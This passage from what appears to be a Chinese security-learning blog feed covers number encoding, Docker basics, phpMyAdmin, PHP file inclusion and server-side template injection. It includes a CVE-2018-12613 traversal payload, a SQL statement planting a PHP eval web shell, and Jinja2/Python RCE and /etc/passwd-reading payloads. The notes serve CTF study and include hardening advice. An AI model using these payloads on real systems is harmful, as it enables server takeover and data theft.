最高位表示数的符号，其他位表示数值<br>        例：[+7]原码=00000111B   [-7]原码=10000111B   <br><br>    反码：<br>        正数的反码和原码相同。<br>        例：[+7]反码=00000111B = [+7]原码<br><br>        负数的反码是由其原码的符号位不变，其余位按位取反。<br>        例：[-7]反码 = 11111000B<br><br>    补码：<br>        正数的补码和原码相同。<br>        例：[+7]补码 = 00000111B = [+7]原码<br><br>        负数的补码是由其原码的符号位不变，其余位按位取反，再在最低位加1.<br>        例：[-7]补码 = 11111001B<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>杂记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker的使用</title>
    <link href="/2022/03/03/Docker%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/03/03/Docker%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h3 id="Docker的基本操作"><a href="#Docker的基本操作" class="headerlink" title="Docker的基本操作"></a>Docker的基本操作</h3><p>2&#x2F;22&#x2F;2021</p><p>晴    正常</p><p>docker的安装：<br>如果已安装过Docker, 需要移除老版本的Docker</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">sudo apt-get remove docker docker-engine docker.io containerd runc<br></code></pre></td></tr></table></figure><p>使用Docker repository 来安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta"># </span><span class="language-bash">更新apt包索引</span><br>sudo apt-get update<br><span class="hljs-meta"></span><br><span class="hljs-meta"># </span><span class="language-bash">为支持https</span><br>sudo apt-get install \<br>    apt-transport-https \<br>    ca-certificates \<br>    curl \<br>    gnupg-agent \<br>    software-properties-common<br><span class="hljs-meta"></span><br><span class="hljs-meta"># </span><span class="language-bash">添加Docker GPG秘钥</span><br><span class="hljs-meta"># </span><span class="language-bash">国内源</span><br>curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add -<br><span class="hljs-meta"># </span><span class="language-bash">或者国外源</span><br><span class="hljs-meta"># </span><span class="language-bash">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="hljs-meta"></span><br><span class="hljs-meta"># </span><span class="language-bash">添加安装源</span><br><span class="hljs-meta"># </span><span class="language-bash">推荐国内源</span><br>sudo add-apt-repository \<br>    &quot;deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu \<br>    $(lsb_release -cs) \<br>    stable&quot;<br></code></pre></td></tr></table></figure><p>安装docker</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta"># </span><span class="language-bash">更新apt包索引</span><br>sudo apt-get update<br><span class="hljs-meta"></span><br><span class="hljs-meta"># </span><span class="language-bash">安装docker</span><br>sudo apt-get install docker-ce docker-ce-cli containerd.io<br></code></pre></td></tr></table></figure><p>开启Docker</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo systemctl enable docker<br>sudo systemctl start docker<br></code></pre></td></tr></table></figure><p>验证是否安装成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo docker run hello-world<br></code></pre></td></tr></table></figure><p>出现下图文字 代表已经安装成功</p><p><img src="https://i.loli.net/2021/03/02/2bYMRnc38l9optQ.png" alt="46958-mjjp9v1xhm9.png"></p><p>配置阿里云镜像加速器<br><img src="https://i.loli.net/2021/03/02/WaS8ZAUj1PQRmhf.png" alt="36189-n7twtog4s3a.png"></p><p>复制红框内容 在终端运行即可</p><p>如果要使用 Docker 作为非 root 用户，则应考虑使用类似以下方式将用户添加到 docker 组：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$ </span><span class="language-bash">sudo usermod -aG docker your-user</span><br></code></pre></td></tr></table></figure><p>至此，docker的安装结束。</p><p>docker的中央仓库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">https://hub.docker.com/<br>https://c.163yun.com/hub/<br>http://hub.daocloud.io/    &#123;推荐使用&#125;<br></code></pre></td></tr></table></figure><p>镜像的操作<br>1.拉取镜像到本地</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull 镜像名称[:tag]<br></code></pre></td></tr></table></figure><p>2.查看全部的本地镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker images<br></code></pre></td></tr></table></figure><p>3.删除本地镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker rmi 镜像的标识<br></code></pre></td></tr></table></figure><p>4.镜像的导入导出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">将本地的镜像导出<br>docker save -o 导出的路径 镜像id<br><br>加载本地的镜像文件<br>docker load -i 镜像文件<br><br>修改镜像名称<br>docker tag 镜像id 新镜像名称:版本<br></code></pre></td></tr></table></figure><p>##容器的操作<br>1.运行容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run 镜像的标识|镜像名称[:tag]<br></code></pre></td></tr></table></figure><p>常用的参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -d -p 宿主机端口:容器端口  --name 容器名称 镜像标识|镜像名称[:tag]<br>-d: 代表后台运行容器<br>-p: 宿主机端口:容器端口：为了映射当前linux的端口和容器的端口<br>--name 容器的名称:指定容器的名称<br></code></pre></td></tr></table></figure><p>2.查看正在运行的容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker -ps [-qa]<br>-a: 查看全部的容器，包括没有运行的容器<br>-q:只查看容器得到标识<br></code></pre></td></tr></table></figure><p>3.查看容器的日志</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker logs -f 容器id<br>-f：可以滚动查看日志的最后几行<br></code></pre></td></tr></table></figure><p>4.进出容器的内部</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker exec -it 容器id bash<br><br>exit 退出容器<br></code></pre></td></tr></table></figure><p>5.删除容器（删除容器前，需要先停止容器）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker stop 容器id<br>停止指定容器<br>docker stop $(docker ps -qa)<br>停止全部容器<br>docker rm 容器id<br>删除指定容器<br>docker rm $(docker ps -qa)<br>删除全部容器<br></code></pre></td></tr></table></figure><p>6.启动容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker start 容器id<br></code></pre></td></tr></table></figure><p>docker run 和docker start的区别</p><blockquote><p>docker run 只在第一次运行时使用，将镜像放到容器中，以后再次启动这个容器时，只需要使用命令docker start 即可。<br>docker run相当于执行了两步操作：将镜像放入容器中（docker create）,然后将容器启动，使之变成运行时容器（docker start）。</p></blockquote><p>数据卷</p><blockquote><p>将宿主机的一个目录映射到容器的一个目录中。可以在宿主机中操作目录的内容，那么<br>容器内部映射的文件，也会跟着一起改变。</p></blockquote><p>1.创建数据卷</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker volume create 数据卷名称<br>创建数据卷之后，会默认存放在一个目录下/var/lib/docker/volume/数据卷名称/_data<br></code></pre></td></tr></table></figure><p>2.查看数据卷的详细信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker volume inspect 数据卷名称<br></code></pre></td></tr></table></figure><p>3.查看全部数据卷</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker volume ls<br></code></pre></td></tr></table></figure><p>4.删除数据卷</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker volume rm 数据卷名称<br></code></pre></td></tr></table></figure><p>5.应用数据卷</p><blockquote><p>​    当你映射数据卷时，如果数据卷不存在。docker会帮你自动创建，会将容器内部自带的<br>​    文件，存储在默认的存放路径中</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -v 数据卷名称:容器内部的路径 镜像id<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">直接指定一个路径作为数据卷的存放位置，这个路径下是空的。<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -v 路径:容器内部的路径 镜像id<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpmyadmin相关</title>
    <link href="/2022/03/03/phpmyadmin%E7%9B%B8%E5%85%B3/"/>
    <url>/2022/03/03/phpmyadmin%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="phpmyadmin相关"><a href="#phpmyadmin相关" class="headerlink" title="phpmyadmin相关"></a>phpmyadmin相关</h1><h3 id="GWCTF-2019-我有一个数据库-CVE-2018-12613-phpMyAdmin远程文件包含漏洞"><a href="#GWCTF-2019-我有一个数据库-CVE-2018-12613-phpMyAdmin远程文件包含漏洞" class="headerlink" title="[GWCTF 2019]我有一个数据库 CVE-2018-12613 phpMyAdmin远程文件包含漏洞"></a>[GWCTF 2019]我有一个数据库 CVE-2018-12613 phpMyAdmin远程文件包含漏洞</h3><p>12&#x2F;4&#x2F;2020</p><p>晴    累</p><p>开局一段文字  那是啥</p><p>dirsearch 发现phpmyadmin目录</p><p>进入 不需要密码  看见版本号为4.8.1  百度搜一下 找到了CVE-2018-12613 phpMyAdmin远程文件包含漏洞</p><p>传入?target&#x3D;db_datadict.php%253f，%253f开始服务器自动解码一次为%3f，然后urldecode函数再解码一次为?，则满足截取?之前的内容在白名单中，返回true。而在index.php中只解码一次为db_datadict.php%3f，然后进行包含 payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs awk">?target=db_datadict.php%<span class="hljs-number">253</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>flag<br></code></pre></td></tr></table></figure><p>得到flag</p><h3 id="phpmyadmin拿shell"><a href="#phpmyadmin拿shell" class="headerlink" title="phpmyadmin拿shell"></a>phpmyadmin拿shell</h3><p><img src="https://i.loli.net/2021/04/14/OgZUFCqz8LW7pvj.png" alt="image-20210414090523316"></p><p>执行下列语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;])?&gt;&quot; into outfile &#x27;/var/www/html/cmd.php&#x27;<br></code></pre></td></tr></table></figure><p>在&#x2F;var&#x2F;www&#x2F;html&#x2F;下生成cmd.php一句话木马文件</p><p><img src="https://i.loli.net/2021/04/14/xH98lGSbNWFjyur.png" alt="image-20210414090745876"></p><p><img src="https://i.loli.net/2021/04/14/dN3Hrbq5EZhWcxo.png" alt="image-20210414090851750"></p><h3 id="phpmyadmin加固"><a href="#phpmyadmin加固" class="headerlink" title="phpmyadmin加固"></a>phpmyadmin加固</h3><blockquote><p>phpMyadmin 也默认提供了访问控制功能，具体配置如下：</p><p>进入 phpMyAdmin 目录，找到 config.inc.php，如果没有，可以将根目录下的config.sample.inc.php 复制为 config.inc.php。</p><p>编辑 config.inc.php，添加下面两行代码，其中 192.168.0.1 是允许访问 phpMyAdmin 的 IP，Access denied 是未经授权访</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ip_prefix</span> = <span class="hljs-string">&#x27;192.168.0.1&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>], <span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$ip_prefix</span>)) != <span class="hljs-variable">$ip_prefix</span> ) <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Access denied&#x27;</span>);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2022/03/03/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2022/03/03/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><blockquote><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p></blockquote><h3 id="常见的文件包含函数"><a href="#常见的文件包含函数" class="headerlink" title="常见的文件包含函数"></a>常见的文件包含函数</h3><blockquote><p>常见的文件包含函数：include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file</p></blockquote><h3 id="PHP伪协议-文件包含漏洞"><a href="#PHP伪协议-文件包含漏洞" class="headerlink" title="PHP伪协议 文件包含漏洞"></a>PHP伪协议 文件包含漏洞</h3><h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4><blockquote><p>PHP伪协议事实上就是支持的协议与封装协议（12种）</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><pre><code class="hljs php">file:<span class="hljs-comment">// — 访问本地文件系统</span><br>http:<span class="hljs-comment">// — 访问 HTTP(s) 网址</span><br>ftp:<span class="hljs-comment">// — 访问 FTP(s) URLs</span><br>php:<span class="hljs-comment">// — 访问各个输入/输出流（I/O streams）</span><br>zlib:<span class="hljs-comment">// — 压缩流</span><br>data:<span class="hljs-comment">// — 数据（RFC 2397）</span><br>glob:<span class="hljs-comment">// — 查找匹配的文件路径模式</span><br>phar:<span class="hljs-comment">// — PHP 归档</span><br>ssh2:<span class="hljs-comment">// — Secure Shell 2</span><br>rar:<span class="hljs-comment">// — RAR</span><br>ogg:<span class="hljs-comment">// — 音频流</span><br>expect:<span class="hljs-comment">// — 处理交互式的流</span><br></code></pre></td></tr></table></figure><h3 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h3><blockquote><p>访问各个输入&#x2F;输出流（I&#x2F;O streams）</p></blockquote><h4 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><blockquote><p>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</p></blockquote><h4 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><blockquote><p>php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。</p></blockquote><p>使用实例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag</span><br></code></pre></td></tr></table></figure><h5 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h5><blockquote><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">resource=&lt;要过滤的数据流&gt;   <span class="hljs-comment">//这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br>read=&lt;读链的筛选列表&gt;       <span class="hljs-comment">//该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br>write=&lt;写链的筛选列表&gt;      <span class="hljs-comment">//该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br>&lt;;两个链的筛选列表&gt;        <span class="hljs-comment">//任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></code></pre></td></tr></table></figure><h5 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">convert.base64-encode &amp; convert.base64-decode等同于<span class="hljs-title function_ invoke__">base64_encode</span>()和<span class="hljs-title function_ invoke__">base64_decode</span>()，base64编码解码<br>convert.quoted-printable-encode &amp; convert.quoted-printable-decode quoted-printable 字符串与 <span class="hljs-number">8</span>-bit 字符串编码解码<br></code></pre></td></tr></table></figure><h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">data:<span class="hljs-comment">// 的常用方法一般是： data://text/plain;(base64,base64编码后的字符串)</span><br><br>如利用?file=data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span>就可以执行<span class="hljs-title function_ invoke__">phpinfo</span>().<br></code></pre></td></tr></table></figure><h3 id="phar-x2F-x2F"><a href="#phar-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h3><p>利用方式：假设你成功上传了一个zip压缩包，里面是一个txt文件，内容是：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php phpinfo(); ?&gt;<br></code></pre></td></tr></table></figure><p>且存在文件包括漏洞，那么你就可以利用<code>phar://</code>来执行这段代码了,payload为：&#96;?phar:&#x2F;&#x2F;test.zip&#x2F;test.txt</p>]]></content>
    
    
    
    <tags>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI</title>
    <link href="/2022/03/03/SSTI/"/>
    <url>/2022/03/03/SSTI/</url>
    
    <content type="html"><![CDATA[<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>12&#x2F;8&#x2F;2020</p><p>阴    emmm</p><h4 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h4><blockquote><p>模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。</p></blockquote><h4 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h4><blockquote><p>确定使用的引擎<br>查看引擎相关的文档，确定其安全机制以及自带的函数和变量<br>需找攻击面，尝试攻击</p></blockquote><h4 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h4><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">简单的数学表达式，&#123;&#123; 7+7 &#125;&#125; =&gt; 14<br>字符串表达式 &#123;&#123; &quot;ajin&quot; &#125;&#125; =&gt; ajin<br>Ruby<br>    &lt;%= 7 * 7 %&gt;<br>    &lt;%= File.open(&#x27;/etc/passwd&#x27;).read %&gt;<br>Java<br>    $&#123;7*7&#125;<br>Twig<br>    &#123;&#123;7*7&#125;&#125;<br>Smarty<br>    &#123;php&#125;echo `id`;&#123;/php&#125;<br>AngularJS<br>    $eval(&#x27;1+1&#x27;)<br>Tornado<br>    引用模块 &#123;% import module %&#125;<br>    =&gt; &#123;% import os %&#125;&#123;&#123; os.popen(&quot;whoami&quot;).read() &#125;&#125;<br>Flask/Jinja2<br>    &#123;&#123; config.items() &#125;&#125;<br>    &#123;&#123;&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()&#125;&#125;<br>Django<br>    &#123;&#123; request &#125;&#125;<br>    &#123;% debug %&#125;<br>    &#123;% load module %&#125;<br>    &#123;% include &quot;x.html&quot; %&#125;<br>    &#123;% extends &quot;x.html&quot; %&#125;<br></code></pre></td></tr></table></figure><p>payload大全:<br>Jinjia2模板引擎通用的RCE Payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;&lt;command&gt;&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p>python2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">[].__class__.__base__.__subclasses__()[<span class="hljs-number">71</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>[].__class__.__base__.__subclasses__()[<span class="hljs-number">76</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)<br><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">60</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)<br><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">61</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)<br><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">40</span>](filename).read()<br><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">29</span>].__call__(<span class="hljs-built_in">eval</span>,<span class="hljs-string">&#x27;os.system(&quot;ls&quot;)&#x27;</span>)<br></code></pre></td></tr></table></figure><p>python3：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pthon">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;]<br>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]<br></code></pre></td></tr></table></figure><p>smarty模板引擎：</p><p>Smarty SSTI</p><p>Smarty是一个PHP的模板引擎，提供让程序逻辑与页面显示（HTML&#x2F;CSS）代码分离的功能。<br>Smarty是基于PHP开发的，对于Smarty的SSTI的利用手段与常见的flask的SSTI有很大区别。</p><p>1.漏洞确认(查看smarty的版本号)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">&#123;$smarty.version&#125;<br></code></pre></td></tr></table></figure><p>2.常规利用方式：（使用{php}{&#x2F;php}标签来执行被包裹其中的php指令，smarty3弃用）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">&#123;php&#125;&#123;/php&#125;<br></code></pre></td></tr></table></figure><p>执行php指令，php7无法使用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<span class="hljs-title function_">phpinfo</span>();&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>3.静态方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getStreamVariable</span>(<span class="hljs-params"><span class="hljs-variable">$variable</span></span>)</span>&#123; <span class="hljs-variable">$_result</span> = <span class="hljs-string">&#x27;&#x27;</span>; <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$variable</span>, <span class="hljs-string">&#x27;r+&#x27;</span>); <span class="hljs-keyword">if</span> (<span class="hljs-variable">$fp</span>) &#123; <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>) &amp;&amp; (<span class="hljs-variable">$current_line</span> = <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>)) !== <span class="hljs-literal">false</span>) &#123; <span class="hljs-variable">$_result</span> .= <span class="hljs-variable">$current_line</span>; &#125; <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>); <span class="hljs-keyword">return</span> <span class="hljs-variable">$_result</span>; &#125; <span class="hljs-variable">$smarty</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;smarty) ? <span class="hljs-variable language_">$this</span>-&gt;smarty : <span class="hljs-variable language_">$this</span>; <span class="hljs-keyword">if</span> (<span class="hljs-variable">$smarty</span>-&gt;error_unassigned) &#123; <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartyException</span>(<span class="hljs-string">&#x27;Undefined stream variable 